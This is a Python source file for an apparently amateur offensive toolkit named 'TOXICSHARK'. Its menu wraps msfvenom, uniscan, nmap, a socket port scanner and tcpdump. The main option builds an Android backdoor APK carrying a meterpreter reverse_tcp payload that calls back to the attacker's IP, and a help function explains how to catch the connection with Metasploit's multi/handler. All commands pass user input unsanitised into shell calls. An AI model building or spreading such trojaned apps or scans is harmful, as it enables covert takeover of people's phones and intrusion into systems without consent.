import os
import subprocess
import time
import colorama
from colorama import Fore, Back, Style
from pynput.keyboard import Key, Controller
from socket import *

print(Fore.BLUE)
print("████████╗░█████╗░██╗░░██╗██╗░█████╗░░██████╗██╗░░██╗░█████╗░██████╗░██╗░░██╗")
print("╚══██╔══╝██╔══██╗╚██╗██╔╝██║██╔══██╗██╔════╝██║░░██║██╔══██╗██╔══██╗██║░██╔╝")
print("░░░██║░░░██║░░██║░╚███╔╝░██║██║░░╚═╝╚█████╗░███████║███████║██████╔╝█████═╝░")
print("░░░██║░░░██║░░██║░██╔██╗░██║██║░░██╗░╚═══██╗██╔══██║██╔══██║██╔══██╗██╔═██╗░")
print("░░░██║░░░╚█████╔╝██╔╝╚██╗██║╚█████╔╝██████╔╝██║░░██║██║░░██║██║░░██║██║░╚██╗")
print("░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝")
print("Created: c0mrade")
    
time.sleep(3)
print(" [1] -- Create msfvenom backdoor for android ")
print(" [2] -- Search for site vulnerabilities ")
print(" [3] -- Nmap scan (flags -sV -Pn)")
print(" [4] -- PyScan (python scanner) ")
print(" [5] -- TCPdump (traffic analysis)")
print(" [777] -- You have any questions? ")
choise = input("---> ")

def questions():
    print("Which you questions?")
    print("[1] -- How to listen connections(android backdoor)? ")
    print("[2] -- Not work search vulnerabilities?" )
    question = input("---> ")
    if question == "1":
        print("[+] You need to log into metasploit and use the exploit/multi/handler to install the android payload/meterpreter/reverse_tcp. And wait, listen")
    elif question == "2":
        print("[+] Download uniscan (sudo apt-get install uniscan) ")

def scan_site():
    url = input("Write url -->  ")
    subprocess.call(f"sudo uniscan -u {url} -qwed", shell=True)

def Create_backdoor_android():
    ip = input("Write your ip --> ")
    subprocess.call(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 R > hackingworld.apk", shell=True)
    time.sleep(3)

    print("Backdoor was created !!")
    time.sleep(2)
    print("Next step your need listen connections")
    print("If you have any questions, enter 1")
    any_question = input("---> ")
    if any_question == "1":
        questions()

def nmap_scan():
    ip = input("[+] Write ip --> ")
    try:
        subprocess.call(f"nmap -sV -Pn {ip}", shell=True)
        print("[+] Success scan")
    except:
        print("Check you install nmap ? (sudo apt-get install nmap)")

def python_scan():
    ports = []
    ip = input("[+] Write ip --> ")
    t_IP = gethostbyname(ip)
    for i in range(5,1000):
        s = socket(AF_INET, SOCK_STREAM)
        conn = s.connect_ex((t_IP, i))
        if conn == 0:
            print(f"[+] Port {i} open !")
            time.sleep(1)
    print("[+] Finish ")

def TCPdump():
    print("[+] Write a interface for analysis (default: wlan0) ")
    time.sleep(0.5)
    interface = input(" --> ")
    if len(interface) > 0:
        try:
            print("File will be written to udp.txt")
            time.sleep(1)
            subprocess.call(f"sudo tcpdump -i {interface} -X  -w udp.pcap --print",shell=True)
        except:
            print("[-] Error check you install tcpdump?(sudo apt-get install tcpdump)")
    else:
        try:
            print("File will be written to udp.txt")
            time.sleep(1)
            subprocess.call("sudo tcpdump -i wlan0 -X  -w udp.pcap --print", shell=True)
        except:
            print("[-] Error check you install tcpdump?(sudo apt-get install tcpdump)")

if choise == "1":
    try:
        Create_backdoor_android()
    except:
        print("Error check please, you download metasploit-framework?")
elif choise == "2":
    try:
        scan_site()
    except:
        print("Error check please, you download uniscan ? (sudo apt-get install uniscan)")
elif choise == "3":
    nmap_scan()
elif choise =="0":
    questions()
elif choise == "777":
    questions()
elif choise == "4":
    python_scan()
elif choise == "5":
    TCPdump()


